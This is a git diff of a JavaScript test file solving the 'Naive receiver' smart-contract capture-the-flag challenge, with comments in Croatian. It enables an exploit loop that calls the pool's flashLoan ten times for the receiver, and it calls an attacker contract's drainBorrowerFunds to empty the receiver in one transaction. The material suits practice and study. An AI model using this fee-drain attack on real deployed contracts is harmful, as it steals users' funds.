@@ -41,19 +41,16 @@ describe('[Challenge] Naive receiver', function () {
         //DEPLOYAMO CONTRACT KOJEM PRISTUPAMO SAMO MI KAO NAPADAČ -> IZ NJEGA POZIVAMO 10 PUTA .flashLoan OD LENDERPOOL CONTRACTA
         //NA OVI NAČIN IMAMO SAMO 1 TRANSAKCIJU NA BLOCKCHAINU->dio di mi pozivamo funkciju na smart contractu -> koji ce bit njeni from,to i value?
         //1. način bez bonusa -> 10 transakcija
-/*         console.log('Pool adress')
+        console.log('Pool adress')
         console.log(this.pool.address)
         console.log('Attacker adress')
         console.log(attacker.address)
+
         for(let i=0;i<10;i++)
         {
-            let transHash=await this.pool.connect(attacker).flashLoan(this.receiver.address,ethers.utils.parseEther('0'))
-            console.log('Transaction '+(i+1))
-            console.log(transHash)
-            //from=napadac
-            //to=smart contract od poola
-            //value=0
-        } */
+            await this.pool.connect(attacker).flashLoan(this.receiver.address,ethers.utils.parseEther('0'))
+        }
+
         //2. način u 1 transakciji pozivamo kao napdac nas contract -> ostatak prepuštamo komunikaciji izmedu 2 smart contracta
         const transhHash=await this.attackerContract.connect(attacker).drainBorrowerFunds(this.receiver.address)
         console.log(transhHash)
